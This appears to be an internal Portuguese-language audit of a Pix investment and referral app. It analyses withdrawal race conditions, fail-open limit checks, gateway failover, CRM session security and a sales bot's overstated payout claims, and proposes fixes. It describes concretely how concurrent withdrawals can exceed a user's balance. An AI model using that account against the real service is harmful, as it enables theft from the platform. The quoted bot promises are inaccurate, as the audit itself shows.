| `routes/wallet.js:777-784` | saque: `newEarn = earnBal - numAmount`, grava absoluto | Dois saques simultaneos de R$15 com saldo R$20 passam **os dois** na validacao (`:762`) e os dois gravam `earnBalance = 5`. O usuario saqueia R$30 com R$20 - **prejuizo direto**. Pior: `createTransaction` (`:795`) cria duas transacoes de saque, entao o extrato mostra os dois, mas o saldo so caiu uma vez |
| `routes/wallet.js:867-873` | check-in: `newEarn = earnBalance + bonus` | Duas chamadas no mesmo segundo (antes do `lastCheckinDate` ser persistido) creditam dois bonus |
| `routes/wallet.js:913-917` | resgate de cupom | Idem, credito duplicado de `promo.amount` |
| `routes/wallet.js:696-703` | expiracao do bonus de boas-vindas | Duas chamadas simultaneas de saque estornam o bonus duas vezes; o `Math.min(earnBal0, bonusAmt)` (`:697`) nao protege porque ambas leem o mesmo `earnBal0` |
| `routes/fleet.js:143-146` | hire: debita `investBalance` e/ou `earnBalance` absolutos | Dois `/hire` simultaneos do mesmo modelo: ambos leem `investBal = 100`, ambos passam em `:101` e em `:117`, ambos gravam `investBalance = 70` -> **uma frota de graça** |
| `routes/admin.js:412-416` | estorno com `totalWithdrawn: Math.max(0, (user.totalWithdrawn||0) - refundAmount)` | Mistura `*Inc` (atomico) com absoluto na mesma chamada; `totalWithdrawn` pode divergir de `getApprovedWithdrawalsTotal` |

O caso do saque (`routes/wallet.js:777-784`) e o mais grave porque combina com a janela de tempo do usuario: um duplo-clique no botao, ou duas abas abertas, ou um retry de rede do proprio app, basta. **Nao ha `claimWithdrawal` no pedido** - a reserva atomica existe so no lado do admin (`database.js:1284-1303`).

**Fix approach:** trocar `newEarn`/absoluto por `earnBalanceInc: -numAmount` + validacao previa; se for obrigatorio o absoluto, usar `UPDATE users SET earn_balance = earn_balance - $1 WHERE id = $2 AND earn_balance >= $1 RETURNING *` e tratar 0 linhas como saldo insuficiente. Para `fleet.js`, idem com `invest_balance >= price`. Envolver `saldo + transaction` em `BEGIN/COMMIT`.

### Modo `data.json` - o que NAO e transacional ali

O fallback em modo arquivo e qualitativamente pior:

- `database.js:200-211` `readJsonDb()` - `readFileSync` do arquivo inteiro + `JSON.parse`. Sem lock, sem cache. **Toda operacao relê e reserializa o arquivo inteiro.**
- `database.js:213-215` `writeJsonDb(data)` - `writeFileSync` do arquivo inteiro, sem tmp+rename, sem fsync. Queda no meio = arquivo truncado.
- `database.js:817-829` (branch JSON de `updateUser`) **emula** os incrementos com `const inc = (k, f) => { ... user[k] = Math.round(((parseFloat(user[k]||0) + parseFloat(fields[f]))*100))/100 }` - mas leu `user` de um snapshot ja carregado do arquivo. Dois `updateUser` concorrentes no mesmo processo: o segundo releu o arquivo **antes** do primeiro gravar? Nao - `readJsonDb()` e synchronous, entao dentro de um unico processo Node o `read -> modify -> write` de `updateUser` **nao tem `await` no meio e portanto e atomico por event-loop**. Ja entre processos (ou com `settleDayNow` + cron em paralelo dentro do mesmo processo, que tem awaits) nao e.
- `database.js:1297-1302` (branch JSON de `claimWithdrawal`) - mesmo padrao synchronous, ok em processo unico.
- `database.js:1297` vs `database.js:201`: **todo `findUserByPhone`, `getAllUsers`, `getAllTransactions` relê e reserializa `data.json`**. Com o arquivo em producao, isso e leitura + parse de dezenas de MB por request.

O problema estrutural e que **`services/settlementEngine.js:140-182` tem `await` dentro do laco**: `await creditSlice(...)` a cada contrato. Entre uma fatia e a seguinte, qualquer outro request pode ter lido e gravado o arquivo. Nesse caso o incremento emulado e perdido. Em Postgres o mesmo laco e seguro (incremento no SQL).

**Conclusao sobre transacionalidade por modo:**

| Operacao | Postgres | `data.json` |
|---|---|---|
| incremento de saldo isolado | atomico (`database.js:788-807`) | atomico **dentro de um processo**; perde escrita entre `await` |
| debit de saldo com validacao de saldo suficiente | **nao existe** | **nao existe** |
| saldo + transaction juntos | **nao existe** (sem `BEGIN`) | **nao existe** |
| reserva de saque (claim) | atomico (`database.js:1291-1295`) | atomico em processo unico |
| leitura consistente sob concorrencia | isolamento do MVCC | snapshot re-lido a cada chamada |

**Fix approach:** ou remover o modo JSON do boot de producao (falhar alto se `DATABASE_URL` ausente em `database.js:220-239`), ou trocar por SQLite em modo WAL. Enquanto o modo JSON existir, ele precisa de lock de arquivo + escrita tmp+rename.

### Diversao de contabilidade: `balance` pode divergir de `invest + earn`

Como `balance` e escrito por caminho absoluto em varios pontos e por incremento em outros, ele nao e garantidamente igual a `invest_balance + earn_balance`. Exemplo concreto: `routes/admin.js:962-985` e outras rotas de ajuste administrativo escrevem `balance` direto. `getGlobalMetrics` (`database.js:1327`) soma `SUM(balance)` como "total em carteiras" - se `balance` divergir, o numero do painel mente. Alem disso `database.js:225-230` (migracao JSON) Assume que todo saldo antigo e de saque e joga `balance -> earnBalance`, o que e uma decisao de negocio hardcoded no boot.

---
## Withdrawal flow - o gate manual

### Como funciona hoje

1. `routes/wallet.js:654-675` - valida chave Pix (formato + DV de CPF em `services/misticpay.js:144-148`) e tipo.
2. `routes/wallet.js:676-678` - minimo (`minWithdraw`, padrao R$ 15, `database.js:1965`).
3. `routes/wallet.js:687-721` - expira o bonus de boas-vindas se 7 dias sem deposito (`services/limits.js:122-127`).
4. `routes/wallet.js:723-758` - limites rolantes de 24h (`services/limits.js:86-119`): pausa global, teto por tx, carencia de conta nova, teto de 7 dias, intervalo de 24h entre saques, teto de 24h do usuario, teto global da plataforma.
5. `routes/wallet.js:761-764` - **saque so sai de `earnBalance`** (rendimentos + comissoes + bonus). Deposito nao e sacavel - tem que virar frota primeiro.
6. `routes/wallet.js:766-775` - exige `totalDeposited >= minDeposit` (R$ 20).
7. `routes/wallet.js:777-784` - debita `earnBalance` e soma `totalWithdrawn`.
8. `routes/wallet.js:790-805` - cria a transacao com `status: 'pending'` (`:792`) e `asaasTransferId = null` (`:794`).
9. `routes/wallet.js:821-832` - notifica o Telegram do admin com valor, chave Pix, total ja sacado.

Depois disso, **um humano** precisa abrir `/admin`, achar o saque e aprovar (`routes/admin.js:299-362`), que e o unico ponto que dispara o Pix.

### Como isso e ao mesmo tempo seguranca e risco operacional

**E uma feature de seguranca real:**
- Impede payout automatico, logo nenhuma falha de webhook, replay ou corrida de saldo vira perda direta de dinheiro - o gateway so e chamado por decisao humana.
- `claimWithdrawal` (`database.js:1284-1303`) e uma reserva atomica `UPDATE ... WHERE status = 'pending'`, que resolve clique duplo do admin.
- `routes/admin.js:333-339` tem uma decisao de design deliberadamente conservadora: se o gateway responder `success` sem id, marca `payoutSent = true` mesmo assim e **nunca reverte para pendente** (`:334-335`, `:358-359`). Isso evita pagar 2x, ao custo de um saque marcado `approved` cujo id nao se conhece - e ruim para reconciliacao manual.

**E um gargalo operacional com risco de pessoa-chave:**
- **Key-person / cobertura.** Nao ha segunda assinatura, nem fila SLA, nem alerta de "saque pendente ha mais de N horas". Se o unico operador do admin nao esta disponivel, o dinheiro fica parado e o cliente recebe a mensagem de "aguarde a aprovacao do administrador" (`routes/wallet.js:793`) sem prazo.
- **Escalada de volume.** O numero de saques pendentes e mostrado no painel (`routes/admin.js:203-204`, `:221-222`), mas nao ha ordenacao por tempo nem bloqueio quando o saldo de saque acumulado cresce. Se o saldo de `earnBalance` da plataforma ficar alto (rendimento horario via `services/settlementEngine.js:233` credita continuamente sem teto global de saldo), a fila de saida vira um passivo.
- **`processing` como limbo.** Se o processo cair entre `claimWithdrawal` (que vira `processing`) e o `updateTransaction` final, o saque fica em `processing` **para sempre** - nao aparece na fila de `pending` do admin. O unico caminho e `routes/admin.js:366-391` (`manual-paid`), que exige o admin saber que isso aconteceu. Nao ha watchdog para isso.
- **Risco de erro humano.** O painel mostra a chave Pix e o valor; o `pixKey` nao tem mascara e o valor e exibido. Um clique errado envia dinheiro real e irreversivel. O `check-gateway` (`routes/admin.js:436`) e **somente leitura** (comentario em `services/misticpay.js:207`), o que e correto, mas deixa a verificacao como passo opcional.
- **O estorno depende de maths que pode divergir.** `routes/admin.js:811-819` soma apenas saques **aprovados** via `getApprovedWithdrawalsTotal`, com o motivo documentado em `:807-810` (o campo `totalWithdrawn` contava pendentes e contaminava o alerta de abuso). Correto - mas significa que `user.totalWithdrawn` e o "ja sacado" do alerta sao **numeros diferentes por design**. Dois caminhos, mesma verdade, garantidos divergentes.

**Fix approach:** (a) fila ordenada por tempo com SLA visivel; (b) alerta no Telegram quando houver saque em `pending` ou `processing` ha mais de 2h; (c) reconciliacao periodica de `processing` velhos; (d) segunda confirmacao (digitar o valor) no botao de aprovar; (e) se o volume subir, avaliar payout automatico com teto por conta e janela de horario, mantendo o gate manual como fallback.

---

## Gateway failover - cadeia e pontos unicos de falha

### A cadeia

A ordem e configuravel no admin (`gatewayOrder` / `gatewayDisabled`, `database.js:1962-1963`, `:2037-2052`). Default: `misticpay,syncpay,asaas,cartpanda`.

- **Criacao de Pix (deposito):** `routes/wallet.js:139-162`. Itera `getGatewayOrder()`, tenta cada `creator`, para no primeiro `{success:true}`. Em falha total: `503` com mensagem de "nenhuma gateway ativa" (`:160`).
- **Envio de Pix (saque):** `routes/admin.js:320-340`. Mesma ideia, porem `syncpay` e `cartpanda` retornam `null` (nao implementam payout) - ou seja, **para saque so sobram `misticpay` e `asaas`**, 2 de 4.
- **MisticPay tem restricao que empurra para a proxima:** `services/misticpay.js:61` exige CPF de 11 digitos; CNPJ de 14 digitos faz o MisticPay falhar e o fallback assume (`:153`). `routes/wallet.js:124` reforca isso, mas so quando a **Asaas** esta habilitada - inconsistente.

### O que esta certo
- Timeouts: `services/misticpay.js:30-44` usa `AbortSignal.timeout(MISTIC_TIMEOUT_MS)` (30s padrao), com o comentario explicando que sem isso o saque fica preso em `processing` (`:28-29`). Boa pratica.
- Confirmacao server-side no deposito MisticPay (`routes/wallet.js:507-520`) - o valor autoritativo vem da API, nunca do corpo do webhook.
- `getGatewayDisabled` / `getGatewayOrder` degradam para a lista completa em caso de erro (`database.js:2049-2051`) - fail-open para nao derrubar deposito por falha de leitura de settings.

### O que esta errado / fragil
- **`asaas.js`, `syncpay.js` e `cartpanda.js` nao tem timeout nenhum.** Verificado: `AbortSignal` so aparece em `services/misticpay.js:39`. `services/asaas.js:18` faz `fetch` sem `signal`. Consequencia em `routes/admin.js:328-340`: se a Asaas enrolar, o request do admin **trava indefinidamente** com o saque ja em `processing` (reservado em `:304`) - exatamente o limbo descrito acima, e sem o log de erro que o MisticPay produziria. Em FREE plan do Render (`render.yaml:8`) o request morre por timeout de plataforma e o estado fica inconsistente.
- **Falta um unico `signal` compartilhado.** Cada servico de gateway reimplementa `fetch`, headers, tratamento de erro e parse. Divergencia ja observada: MisticPay normaliza erro e guarda `lastError` para o admin (`services/misticpay.js:19-26`, exposto em `routes/admin.js:129`); os outros tres nao.
- **Diagnostico expoe URL de terceiro:** `routes/crm.js:95` devolve `EVOLUTION_API_URL` no corpo do erro.
- **Ordem de fallback pode gerar cobranca duplicada.** `routes/wallet.js:147-157`: se a gateway 1 criar a cobranca e a resposta se perder (timeout), o loop tenta a gateway 2 e o usuario paga duas vezes. O `savePixCharge` (`:164-166`) e fire-and-forget (`.catch(...)` sem await), o que agrava.
- **`getAllTransactions()` no path do saque:** `routes/wallet.js:734` le **todas** as transacoes da plataforma so para somar o teto global de 24h. Em Postgres isso e `SELECT *` sem `WHERE` sobre a tabela inteira (`database.js:1164`) a cada tentativa de saque. Ver Performance abaixo.
- **`cartpanda` e o ultimo recurso mas e o unico que "funciona sem token"** (`services/cartpanda.js:11-12` gera um payload simulado quando `CARTPANDA_API_TOKEN` esta ausente). Se o fallback alcancar essa "gateway", o `pixCopyPaste` devolvido ao usuario e **simulado** - e o `routes/wallet.js:159` trata como sucesso e devolve 200. Dinheiro que nunca entra.

**Fix approach:** `AbortSignal.timeout` em todos os servicos de gateway (padrao 30s); mover o teto global de 24h para uma coluna agregada em vez de `SELECT *`; decidir conscientemente se `cartpanda` sem token deve falhar em vez de simular; amarrar o `savePixCharge` ao request e reconciliar cobranca orfa.

---

## MisticPay - expiracao de autenticacao em 2026-09-30 (HOJE)

### Verificacao

- `services/misticpay.js:4` (comentario de cabecalho): *"Auth: Chave de acesso pk_/sk_ via HTTP Basic (ci/cs legado morre em 30/09/2026)"*.
- `services/misticpay.js:6-8` le `MISTIC_PK` / `MISTIC_SK` do ambiente; `:14-17` monta `Authorization: Basic base64(pk:sk)`.
- O plano antifraude nao menciona esse item. **Nenhum outro arquivo do repo registra awareness da data.**

### Avaliacao - VERIFICAR HOJE, 2026-09-30

A data de expiracao do esquema legado `ci`/`cs` e **hoje**. O codigo ja usa o esquema novo (`pk_`/`sk_` via HTTP Basic), entao o risco **nao** e o codigo precisar mudar de formato. Os riscos reais sao:

1. **As credenciais em producao podem ser do par legado.** Se `MISTIC_PK`/`MISTIC_SK` em `render.yaml:40-43` nao tiverem sido rotacionadas para o par novo, a partir de hoje toda chamada falha com `401`. Como o MisticPay e o **primeiro** da cadeia default (`database.js:1962`), a falha cascateia para `syncpay` -> `asaas` -> `cartpanda`, e depositos passam a cair na ultima opcao (que pode ser a simulada - ver Gateway acima).
2. **Nao ha como distinguir "credencial expirada" de "gateway fora".** `services/misticpay.js:46-49` transforma qualquer `!res.ok` em `throw` com a mensagem do gateway; `noteError` (`:21-23`) guarda so a **ultima** mensagem em memoria do processo. O admin ve `getMisticStatus()` (`routes/admin.js:129`) com `lastError` volátil - que zera a cada restart/deploy.
3. **Falha silenciosa no caminho do saque.** Em `routes/admin.js:328-340` o erro do MisticPay vira `payoutError` e o loop segue. O admin recebe `502` e o saque volta para `pending` (`:341-344`). Correto - mas se o MisticPay e a **unica** gateway habilitada para payout e a credencial expirou, todo saque da plataforma fica travado sem alerta proativo.
4. **`isMisticEnabled()` so verifica comprimento** (`services/misticpay.js:10-12`: `length > 5`). Uma variavel preenchida com lixo passa como "habilitada".

**Fix approach (urgente, 2026-09-30):**
1. **Na primeira hora:** confirmar em `/admin > /gateways` (`routes/admin.js:124-139`) se `mistic.enabled === true` **e** `lastError` esta nulo, e confirmar que uma recarga de teste ponta a ponta passa pelo MisticPay (e nao pelo fallback).
2. Se `MISTIC_PK`/`MISTIC_SK` forem o par legado, rotacionar no painel do MisticPay e atualizar em `render.yaml`.
3. Adicionar alerta no Telegram quando `isMisticEnabled()` for `true` mas a primeira chamada do dia falhar - hoje o unico sinal e o console.
4. Tornar `lastError` persistente (tabela ou arquivo) e nao sobrescrever sem historico, para nao perder diagnostico em deploy.
5. Validar o **formato** das chaves em `isMisticEnabled()` (prefixo `pk_`/`sk_`), nao so o tamanho.

---

## `services/crmSession.js` - revisao do codigo novo

Arquivo novo (61 linhas), introduced no pull. Fecha um problema real e grave: antes, o CRM emitia um token que **ninguem validava**, e as rotas em `routes/crm.js` eram publicas - qualquer um na internet lia todos os leads (LGPD) e usava a conta de WhatsApp da empresa. O comentario de cabecalho (`:1-7`) esta correto nesse diagnostico.

### O que esta bem feito
- **Fail-safe sem chave:** `services/crmSession.js:30` - `if (!secret()) return false`. Sem `CRM_SECRET`/`ADMIN_KEY`, **nenhum** cookie valida. E `routes/crm.js:16-18` reforca com `throw` em producao.
- **HMAC-SHA256 sobre `id.exp`** (`:17-19`) e comparacao **constant-time** com checagem de tamanho antes (`:36-39`) - `crypto.timingSafeEqual` exige buffere de mesmo tamanho e o codigo trata isso (`:38`). Implementacao correta.
- **Cookie httpOnly + SameSite=Lax** (`:43-48`), `secure` condicionado a `NODE_ENV === 'production'` (`:46`). `maxAge` bate com o TTL (`:47`).
- **Entropia do id:** `crypto.randomBytes(24)` (`:23`) = 192 bits. Sem adivinhavel.
- **Acesso no login certo:** `routes/auth.js:218` chama `setCookie` dentro do branch de senha do CRM, e o branch so dispara quando `!phone && password` (`:212`) e a senha bate (`:214`).

### Lacunas e riscos

1. **Sem revogacao (SEC-06).** Token auto-contido, TTL 12h, sem store. `clearCookie` (`:51-53`) e exportada e **nunca chamada** em lugar nenhum do repo - grep confirma. O logout do bundle do CRM so apaga `localStorage`, entao a sessao httpOnly sobrevive.
2. **Segredo compartilhado com o admin (SEC-05).** `secret()` (`:13-15`) faz fallback para `ADMIN_KEY`/`ADMIN_PASSWORD`. Um vazamento da senha do admin vaza as duas superficies.
3. **Rota de handshake do Meta quebrada (BUG-01).** O middleware global de `routes/crm.js:33-36` **catch-all** em vez de allow-list, e a consequencia e que `GET /leads/webhook` (verificacao Meta) recebe 401. Um PUT/POST novo de webhook no CRM precisa lembrar de entrar na excecao - default inseguro.
4. **Sem protecao CSRF explicita.** `sameSite: 'lax'` bloqueia POST cross-site, o que cobre o caso comum. Mas: (a) nao ha token CSRF; (b) `GET /messages/:leadId` escreve estado (SEC-13), e GET cross-site de topo **envia** o cookie com `lax`; (c) qualquer subdominio do mesmo registrable domain envia o cookie.
5. **`secure` desligado fora de producao.** Se o deploy rodar com `NODE_ENV` != `production` por engano, o cookie trafega em claro e nenhum dos guards de `routes/admin.js:65-67` / `middleware/auth.js:7-9` dispara. Acoplar `secure` a `NODE_ENV` e fragile - melhor `secure: true` com excecao explicita para localhost.
6. **Token nao esta linked a nada.** Nao ha binding a IP, user-agent ou fingerprint. Robusto contra robo - e por isso que 12h de sessao sem revogacao e o unico ponto fraco.
7. **`getGatewayOrder`-style degradacao nao existe aqui.** Se `secret()` mudar (rotacao de `ADMIN_KEY`), todas as sessoes caem silenciosamente e o usuario ve 401 sem explicacao. Nenhuma tela trata isso.

### Veredito
Fecha o buraco critico e a implementacao criptografica esta correta. Os problemas sao de **escopo do middleware** (BUG-01, o mais grave) e de **gestao de sessao** (sem revogacao, segredo compartilhado). Nao ha falha criptografica.

---

## Copy mismatch - bonus de check-in

**Divergencia confirmada em 2026-09-30.**

- **O que o bot promete** (`services/aiSdrEngine.js:54`, intent `daily_checkin`, disparado por `services/crm.js:311-319` para leads reais de WhatsApp):
  > "Ganhe de **R$ 0,50 a R$ 2,00 todo dia** creditado direto no seu saldo de forma 100% gratuita!"

- **O que o codigo paga** (`routes/wallet.js:852-895`, `POST /api/wallet/checkin`):
  - `routes/wallet.js:861` comentario: `// Check-in: R$ 0,10-0,60 (90%) ou R$ 0,61-0,89 (10% - raro, mas possivel)`
  - `routes/wallet.js:863-865`: `roll < 0.9 ? 10 + floor(random()*51) : 61 + floor(random()*29)` -> faixa real **R$ 0,10 a R$ 0,89**, media ~R$ 0,38.

- O plano de auditoria anterior citava `routes/wallet.js:843-847`; os numeros de linha deslocaram e hoje o codigo esta em `:861-866`.

**Por que importa:** a promessa vai por WhatsApp para potenciais clientes, e e uma **divergencia publicitaria de ~4x no teto e ~5x na media**. Para o topo da faixa (R$ 0,89) o cliente foi prometido R$ 2,00. Isso e (a) risco de reclamacao/publicidade enganosa, (b) risco de chargeback no gateway, (c) exactement o tipo de coisa que o anti-fraude tenta evitar (cliente insatisfeito que abre 20 contas para recuperar as diferencas).

**Onde o valor correto nao aparece:** `public/index.html:656` mostra o valor dinamico (`R$ 0,00` placeholder), entao **nao ha copy de valores no front** - a unica fonte do numero errado e `services/aiSdrEngine.js:54`. Isso torna a correcao de uma linha.

**Fix approach:** (imediato) corrigir `services/aiSdrEngine.js:54` para a faixa real; (melhor) derivar do backend em vez de hardcodar - expor a faixa em `GET /api/admin/public-settings` (`routes/admin.js:70-85`, ja publico) e ter o bot ler de la, para que a verdade tenha uma unica fonte.

### Outros copy mismatches na mesma area (mesma classe de bug)

O mesmo arquivo tem outras tres divergencias contra o codigo de negocio:

| O que o bot diz | O que o codigo faz |
|---|---|
| `services/aiSdrEngine.js:69`: "15% (N1), 10% (N2), 5% (N3)" | `services/careerEngine.js:78-84`: `LEVEL_PERCENTS` = **10% planos nos 5 niveis** |
| `services/aiSdrEngine.js:69`: Prata(5) / Ouro(15) / Rubi(50) / Diamante(150) / Black Diamond(500) e bonus R$100 / R$300 / R$1.000 / R$3.000 / R$10.000 | `services/careerEngine.js:9-76`: `minDirects` = 0/5/5/10/15/25 e `bonus` = 0/50/150/500/2000/10000 |
| `services/aiSdrEngine.js:83`: tabela de cotas e "Os rendimentos caem todo dia a meia-noite" | `server.js:233` agenda gotejamento **por hora** (`7 * * * *`) e `services/settlementEngine.js:19,144` pula **domingo** |

O terceiro e o mais customer-visible: o bot diz "meia-noite, todo dia", e na verdade o rendimento e creditado em 24 fatias horarias e **nao credita domingo**. 

**Fix approach:** tratar `services/aiSdrEngine.js` como conteudo de marketing que precisa de owner de negocio e revisao; idealmente gerar as respostas do bot a partir de `GET /api/admin/public-settings` + `services/careerEngine.js` `RANKS`/`LEVEL_PERCENTS` (que ja sao exportados, `services/careerEngine.js:271-276`), para eliminar a duplicacao por construcao.

---
## Tech Debt

**`updateUser` com dois contratos de escrita (absoluto e incremental) - a origem da maioria dos races financeiros**
- Issue: `database.js:717-831` aceita `balance` (absoluto) **e** `balanceInc` (atomico, `balance = COALESCE(balance, 0) + $n`). As rotas usam os dois indiscriminadamente. Quem escreve por `*Inc` esta seguro; quem escreve por absoluto fez read-modify-write.
- Why: evolucao incremental - os incrementos atomicos foram introduzidos depois (webhooks) e as rotas antigas nunca migradas.
- Impact: detalhado em "Money arithmetic". 6 locais com race confirmada.
- Fix approach: padronizar `*Inc`; para os casos que exigem absoluto, `UPDATE ... WHERE saldo >= valor RETURNING *` ou `SELECT ... FOR UPDATE` dentro de transacao explicita.

**Zero transacoes em 2180 linhas de DAL**
- Issue: nenhuma ocorrencia de `BEGIN`/`COMMIT`/`ROLLBACK` em `database.js`. Todo fluxo de dinheiro com 2+ escritas pode deixar estado parcial.
- Impact: ver tabela em "Money arithmetic".
- Fix approach: helper `withTransaction(fn)` usando `pool.connect()` (o `initDb` ja faz `await pool.connect()` em `database.js:241`, o padrao existe).

**`database.js` como DAL dual-branch de 2180 linhas**
- Issue: ~70 funcoes de repositorio, cada uma com `if (isPostgres) { ...pg... } else { ...JSON... }` (`database.js:576-2085`). O comportamento diverge silenciosamente.
- Why: migracao do JSON para Postgres feita por sobreposicao em vez de reescrita.
- Impact: bug corrigido num ramo nao existe no outro. Exemplo ja presente: `findUserByPhone` tem a logica de sufixo **duas vezes** (`database.js:627-637` no Postgres, `:647-651` no JSON). E o `require` errado de `services/backup.js:48` so existe num ramo.
- Fix approach: fixar Postgres como unico backend (falhar alto no boot sem `DATABASE_URL`), ou isolar atras de uma interface com testes contra ambas.

**`services/crmDb.js` - um arquivo JSON reescrito inteiro por operacao, sem lock**
- Issue: `services/crmDb.js:47-59` le e parsea o arquivo inteiro a cada chamada; `:61-67` grava o inteiro. Nao ha lock, cache, nem tmp+rename. `db.getSettings()` (`:70`) le o arquivo - e chamado em `routes/crm.js:40,53,59,102,150` e `services/keepAliveWatchdog.js:10`.
- Impact: todo lead novo, toda mensagem e toda `updateLead` reserializa o funil inteiro. Ver BUG-07 e BUG-08 (perda total de dados).
- Fix approach: Postgres (o CRM nao precisa de um segundo banco), ou ao minimo tmp+rename + cache com invalidacao.

**Estado local em memoria usado para controle (reinicia e perde)**
- Issue: `routes/admin.js:88` `let lastVerifyAlertAt = 0` (throttle do alerta anti-invasao); `routes/support.js:7` `const lastSupportNotify = new Map()` (throttle de 3 min por usuario, **cresce sem limite** - memory leak); `services/misticpay.js:20` `let lastError = null`; `services/syncpay.js:14-15` `cachedToken`/`cachedTokenExp`.
- Impact: throttle some a cada restart (Render free reinicia bastante) e o `Map` de `routes/support.js:7` nunca e podado - um Map por usuario que ja mandou mensagem, pelo tempo de vida do processo.
- Fix approach: mover para o banco ou usar um LRU com TTL.

**Rate limiting so em memoria e so no plano free**
- Issue: `server.js:35` comenta explicitamente *"plano free: MemoryStore, single-instance"*. `server.js:24` `app.set('trust proxy', 1)`.
- Impact: se a aplicacao escalar para mais de uma instancia (ou o Render trocar de instancia), os contadores zeram e o limite e ineffective. Alem disso `trust proxy = 1` significa que **so o primeiro** `X-Forwarded-For` e confiavel; se houver CDN/proxy duplo, o atacante manda o header.
- Fix approach: `trust proxy` = numero exato de saltos; store compartilhado (Redis) antes de escalar.

**Gate de i18n repetido centenas de vezes, sem build step**
- Issue: o padrao `window.TruckAutoI18n ? window.TruckAutoI18n.t('k') : 'literal PT'` aparece ~216 vezes em `public/app.js` (exemplos em `:442`, `:1814`, `:1988`, `:2065`, `:2710`). Alem disso **33** mensagens de erro PT hardcoded em `routes/wallet.js`, **8** em `routes/auth.js`, **8** em `routes/fleet.js`, e 12 mensagens em `services/limits.js:75-119`.
- Impact: string nova sem gate nao gera nenhum sinal (sem lint, sem build, sem teste). O usuario ES/EN/ZH recebe erro em portugues no path de saque.
- Fix approach: helper unico `T(chave, fallback)` em `public/i18n.js` + teste de paridade que varra `app.js`; no backend, codigo estavel (`WD_LIMIT_24H`) + `{code, params}` no JSON.

**O bot de IA e um segundo "backend" sem teste, com conteudo comercial hardcoded**
- Issue: `services/aiSdrEngine.js` mantem, em template strings, a tabela de precos (`:83`), as percentuais de comissao (`:69`) e os valores de bonus (`:54`, `:138`, `:145`). Nenhum teste cobre esse arquivo. Nenhum owner definido.
- Impact: qualquer mudanca de preco/percentual no admin ou em `careerEngine.js` deixa o bot Falando Valores de um mes atras. Ver Copy mismatch.
- Fix approach: derivar de `services/careerEngine.js` (`RANKS`, `LEVEL_PERCENTS`) e de um endpoint publico de settings.

**`public/admin.html` - monolito de ~1500 linhas de `<script>` inline, sem `escapeHtml`**
- Issue: `public/admin.html:1460` em diante e script inline (o arquivo inteiro tem 2935 linhas). `public/app.js:1352` define `escHtml`; **o admin nao define equivalente** (grep: 0 hits em `admin.html`).
- Impact: sem CSP (SEC-11) e sem escape helper, qualquer interpolacao de dado de usuario em `innerHTML` e XSS com acesso a sessao de admin - que e chave de dinheiro. Vale uma auditoria dedicada de `innerHTML` no admin; o app do operador escaped corretamente (`public/app.js:33` `cleanTxText` usa `escHtml`, e `:2100` usa `cleanTxText`).
- Fix approach: extrair `admin.js`, adicionar `escHtml` espelhado, e um teste que falhe se `innerHTML` receber interpolacao sem escape.

**Ciclo de vida da sessao do CRM nao integrado ao front (o commit nao atualizou o bundle)**
- Issue: o servidor parou de devolver `token` em `routes/auth.js:219-222` e passou a emitir cookie. O bundle do CRM (em `public/crm/`, artefato compilado, sem build no repo) ainda le `localStorage.truckauto_crm_token` para decidir "esta logado" e ainda faz `localStorage.setItem("truckauto_crm_token", Z.token)` (que agora recebe `undefined`).
- Impact: (a) o `undefined` e gravado como string `"undefined"` e lido como truthy no `!!localStorage.getItem(...)`, o que **acidentalmente** ainda funciona como flag; (b) o "Sair do Painel" so apaga essa flag - o cookie continua valido (SEC-06); (c) qualquer mudacao no contrato exige rebuild do bundle, e nao ha pipeline.
- Fix approach: chavear o front pelo estado do servidor (`GET /api/crm/health` ja e publico e devolve `authRequired`), e adicionar build do CRM ao repo.

---

## Performance

**PERF-01 - `getAllTransactions()` no caminho quente do saque**
- Issue: `routes/wallet.js:733-739` chama `getAllTransactions()` a cada tentativa de saque so para somar `globalWithdraws24h`. Em Postgres isso e um `SELECT *` sem `WHERE` sobre a tabela inteira (`database.js:1164`), trazido para o Node e filtrado em JS.
- Impact: O(total de transacoes) por saque, crescendo sem limite. Em `data.json` e pior: le e parsea o arquivo inteiro. Como o teto global (`services/limits.js:115`) e um controle de **seguranca**, ele nao pode falhar - mas um timeout aqui trava o saque e provavelmente cai no `catch` de `routes/wallet.js:758` que **deixa passar**.
- Fix approach: coluna agregada `SUM(amount)` por janela, ou tabela de rollup diaria; ou `SELECT COALESCE(SUM(ABS(amount)),0) FROM transactions WHERE type='withdraw' AND status IN (...) AND created_at >= $1` e nunca materializar as linhas.

**PERF-02 - O `catch` de limite de saque **aprova** quando a verificacao falha**
- Issue: `routes/wallet.js:758` - `} catch (e) { console.error('[WALLET] withdraw limits check:', e.message); }` e o fluxo **segue** para o debit (`:761+`).
- Impact: se o teto global de 24h (`R$ 20.000`, `database.js:1975`) ou a carencia de conta nova falhar por timeout de banco, o limite e **bypassado silenciosamente** e o saque vai. Fail-open num controle de risco.
- Fix approach: fail-closed - `return res.status(503)` dentro do `catch`. Mesmo padrao para `routes/wallet.js:122` (limite de deposito, tambem fail-open).

**PERF-03 - `getAllUsers()` dentro de loops**
- Issue: `routes/team.js:15`, `routes/wallet.js:67` (`/summary`), `routes/wallet.js:531` e `:606` e `:622` (fallbacks de CPF/nome nos webhooks), `services/careerEngine.js:229` e `:239` (dentro do laco de 5 niveis em `distributeCareerCommissions`, `services/careerEngine.js:239` chama `calculateUserNetwork(uplineUser.id, allUsers)` - ok, usa o array em memoria).
- Impact: `routes/wallet.js:531` e `:606` rodam `getAllUsers()` **dentro do handler de webhook** e depois fazem `Array.find` por CPF - O(n) por webhook, com `getAllUsers` materializando a tabela de usuarios. Com `data.json` isso e reler e parsear o arquivo.
- Fix approach: indice unico por `cpf_cnpj` (`CREATE INDEX`) e uma funcao `findUserByCpf` - que e o item 1 do plano antifraude (`plano-antifraude-bonus-R5.md:29`). Um ganho de performance e um ganho de seguranca na mesma funcao.

**PERF-04 - `getContractsByUserId` dentro de laco no backup diario**
- Issue: `services/backup.js:18` (laco por usuario) e `services/backup.js:36` (segundo laco, **repete** a mesma query). 2N queries por dia.
- Impact: as duas rods em `:15` e `:33` sao lancos separados que fazem exatamente a mesma coisa; a segunda existe so porque `backup.js:35` re-require o modulo. Dobre o custo sem ganho.
- Fix approach: um laco, `require` no topo.

**PERF-05 - `express.json({ limit: '50mb' })` global**
- Issue: `server.js:27-28` - 50 MB para JSON e urlencoded, **global**, incluindo `/api/auth/login` e `/api/admin/*`.
- Impact: um unico request pode alocar 50 MB. Com `body-parser` isso e refinado **depois** do parse. Um atacante (ou um bug de loop no front) manda corpos enormes para qualquer rota. O `@fastify`/limite correto e 50 MB so no endpoint que precisa (hoje nenhum precisa).
